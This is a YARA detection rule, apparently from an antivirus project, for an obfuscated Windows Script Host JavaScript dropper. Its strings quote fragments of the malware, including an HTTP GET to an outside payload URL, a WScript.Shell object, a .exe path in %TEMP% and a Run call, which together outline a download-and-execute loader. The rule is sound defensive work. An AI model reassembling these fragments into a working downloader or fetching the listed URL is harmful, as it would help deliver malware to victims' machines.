rule sig_20160330_0815d6bec6062278f35b054315404ea9 {
  meta:
    description = "datamaliciousorder - file 20160330_0815d6bec6062278f35b054315404ea9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ce3546293c2881b3438ea7e16dba2e4c14246688050a2a83a8617114bf4df766"

  strings:
    $s1  = "UH[DU](\"GET\", \"http://be-stlines-tore.com/u3rsap\", false);" fullword ascii
    $s2  = "function I(ZB, HQ){A = A * 1; return ZB - HQ;};" fullword ascii
    $s3  = "var K0 = function OE() {return WScript[KO](\"WScript\"+\".Shell\");}(), Z0 = 11;" fullword ascii
    $s4  = "if (UH[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function KY(){return HO + \"\";};" fullword ascii
    $s6  = "function OT() {return K0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"YQyXhc6tjPOKSZo8.ex\" + \"e\";};" fullword ascii
    $s7  = "function SA(O){K0[\"Run\"](O, A, A);};" fullword ascii
    $s8  = "function U() {return ((UD == true) && (UD == M)) ? 1 : A;};" fullword ascii
    $s9  = "function Y(){return 22;};" fullword ascii
    $s10 = "}while (KH);" fullword ascii
    $s11 = "function GY()" fullword ascii
    $s12 = "return I(XR, E0);" fullword ascii
    $s13 = "var KU = new this[\"Date\"]();" fullword ascii
    $s14 = "function L(OE0) {var E = (1, 2, 3, 4, 5, OE0); return E;};" fullword ascii
    $s15 = "function S(){return KO;};" fullword ascii
    $s16 = "M = true; " fullword ascii
    $s17 = "var LX = false;" fullword ascii
    $s18 = "var UD = false;" fullword ascii
    $s19 = "UD = true; " fullword ascii
    $s20 = "} catch(Q){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}